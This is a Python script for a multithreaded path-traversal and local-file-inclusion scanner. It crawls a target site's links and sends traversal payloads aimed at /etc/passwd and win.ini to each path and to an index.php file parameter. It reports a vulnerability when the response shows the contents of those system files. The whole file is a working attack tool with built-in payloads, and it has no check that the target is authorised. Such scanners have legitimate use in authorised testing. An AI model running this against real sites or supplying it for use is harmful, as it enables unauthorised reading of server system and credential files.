import requests
import os
import sys
import re
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def print_banner():
    banner = r"""
    ███╗   ██╗ ███████╗ ██╗  ██╗ ██╗   ██╗ ███████╗  
    ████╗  ██║ ██╔════╝ ╚██╗██╔╝ ██║   ██║ ██╔════╝  
    ██╔██╗ ██║ █████╗    ╚███╔╝  ██║   ██║ ███████╗  
    ██║╚██╗██║ ██╔══╝    ██╔██╗  ██║   ██║ ╚════██║   
    ██║ ╚████║ ███████╗ ██╔╝ ██╗ ╚██████╔╝ ███████║       
    ╚═╝  ╚═══╝ ╚══════╝ ╚═╝  ╚═╝  ╚═════╝  ╚══════╝       
    [ Path Traversal & LFI Vulnerability Scanner ]
    """
    print("\033[1;36m" + banner + "\033[0m")
    print("\033[1;30m" + "=" * 70 + "\033[0m")


def load_payloads(filename="payloads.txt"):
    payloads = []
    if os.path.exists(filename):
        with open(filename, "r", encoding="utf-8") as f:
            payloads = [line.strip() for line in f if line.strip()]

    default_payloads = [
        "../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..\\..\\..\\..\\windows\\win.ini",
        "....//....//....//....//etc/passwd",
        "/etc/passwd"
    ]
    combined = list(set(payloads + default_payloads))
    print(f"\033[1;32m[+]\033[0m Loaded total \033[1;33m{len(combined)}\033[0m payloads.")
    return combined


def extract_links_from_page(url):
    print(f"\n\033[1;34m[*]\033[0m Extracting links from index: \033[4m{url}\033[0m")
    found_links = set()
    found_links.add(url)
    try:
        response = requests.get(url, timeout=5)
        hrefs = re.findall(r'href=["\'](.*?)["\']', response.text)

        parsed_base = urlparse(url)
        base_domain = parsed_base.netloc

        for link in hrefs:
            full_url = urljoin(url, link)
            parsed_link = urlparse(full_url)
            if parsed_link.netloc == base_domain and '#' not in full_url:
                if not re.search(r'\.(css|js|png|jpg|jpeg|gif|ico|svg|pdf)$', parsed_link.path, re.I):
                    found_links.add(full_url)

    except Exception as e:
        print(f"\033[1;31m[-]\033[0m Error extracting links: {e}")

    return list(found_links)


def test_single_payload(test_url, payload, success_indicators):
    try:
        response = requests.get(test_url, timeout=2)
        matched = any(indicator in response.text for indicator in success_indicators)
        return (test_url, payload, response.status_code, matched)
    except requests.exceptions.RequestException:
        return (test_url, payload, None, False)


def run_scanner(targets, payloads):
    success_indicators = ["root:x:", "bin:x:", "[extensions]", "for 16-bit app support", "localhost", "Linux version"]

    tasks = []
    for target in targets:
        clean_url = target.rstrip('/')
        for payload in payloads:
            test_urls = [
                f"{clean_url}/{payload}",
                f"{clean_url}/index.php?file={payload}"
            ]
            for url in test_urls:
                tasks.append((url, payload))

    total_tests = len(tasks)
    vulnerable_results = []
    completed_count = 0

    status_counts = {
        200: 0,
        400: 0,
        403: 0,
        404: 0,
        500: 0,
        "Other": 0
    }

    print(
        f"\n\033[1;33m[*]\033[0m Starting live scan... Total requests: \033[1;35m{total_tests}\033[0m\n" + "\033[1;30m" + "=" * 70 + "\033[0m")

    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(test_single_payload, url, payload, success_indicators): (url, payload) for
                   url, payload in tasks}

        for future in as_completed(futures):
            completed_count += 1
            test_url, payload, status_code, matched = future.result()

            if status_code in status_counts:
                status_counts[status_code] += 1
            else:
                status_counts["Other"] += 1

            if matched:
                vulnerable_results.append((test_url, payload, status_code))
                sys.stdout.write(
                    f"\r\033[K\033[1;31m[!] VULNERABILITY FOUND:\033[0m \033[1;32m{test_url}\033[0m | Payload: {payload} | Code: {status_code}\n")
                sys.stdout.flush()

            if completed_count % 50 == 0 or completed_count == total_tests:
                status_line = (
                    f"\r\033[K\033[1;36m[*] Scanning [{completed_count} / {total_tests}]\033[0m | "
                    f"\033[32m200: {status_counts[200]}\033[0m | "
                    f"\033[33m400: {status_counts[400]}\033[0m | "
                    f"\033[35m403: {status_counts[403]}\033[0m | "
                    f"\033[31m404: {status_counts[404]}\033[0m | "
                    f"\033[34m500: {status_counts[500]}\033[0m | "
                    f"\033[37mOther: {status_counts['Other']}\033[0m"
                )
                sys.stdout.write(status_line)
                sys.stdout.flush()

    print("\n\n\033[1;30m" + "=" * 70 + "\033[0m")
    print(f"\033[1;32m[*]\033[0m Scan finished. Total executed: \033[1;33m{total_tests}\033[0m")

    if vulnerable_results:
        print(f"\n\033[1;31m[+] Summary: Found ({len(vulnerable_results)}) matching vulnerabilities/results:\033[0m\n")
        for idx, (url, payload, code) in enumerate(vulnerable_results, 1):
            print(f" \033[1;33m{idx}.\033[0m URL: \033[1;32m{url}\033[0m")
            print(f"    Payload: {payload} | Code: {code}\n")
    else:
        print("\033[1;33m[-]\033[0m No matching vulnerabilities found.")


if __name__ == "__main__":
    clear_screen()
    print_banner()

    payloads = load_payloads()
    if not payloads:
        sys.exit()

    target_input = input("\n\033[1;36m[?] Enter target URL: \033[0m").strip()
    if not target_input:
        sys.exit()

    choice = input("\033[1;36m[?] Scan sub-paths from index? (y/n): \033[0m").strip().lower()

    if choice == 'y':
        targets = extract_links_from_page(target_input)
        print(f"\n\033[1;32m[+]\033[0m Discovered targets list:")
        print("\033[1;30m" + "-" * 70 + "\033[0m")
        for idx, t in enumerate(targets, 1):
            print(f" \033[1;33m{idx}.\033[0m {t}")
        print("\033[1;30m" + "-" * 70 + "\033[0m")
    else:
        targets = [target_input]
        print(f"\n\033[1;32m[+]\033[0m Target list:")
        print("\033[1;30m" + "-" * 70 + "\033[0m")
        print(f" \033[1;33m1.\033[0m {target_input}")
        print("\033[1;30m" + "-" * 70 + "\033[0m")

    run_scanner(targets, payloads)